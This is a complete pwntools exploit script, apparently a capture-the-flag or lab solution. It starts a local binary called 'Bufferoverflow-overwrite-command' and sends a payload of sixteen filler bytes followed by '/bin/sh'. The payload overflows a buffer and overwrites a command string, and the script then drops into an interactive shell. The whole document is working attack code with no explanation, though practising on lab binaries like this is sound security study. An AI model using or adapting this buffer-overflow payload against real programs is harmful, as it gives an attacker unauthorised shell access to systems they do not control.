from pwn import *

p = process("./Bufferoverflow-overwrite-command")

payload = b'a'*16 + b'/bin/sh'
p.sendline(payload)

p.interactive()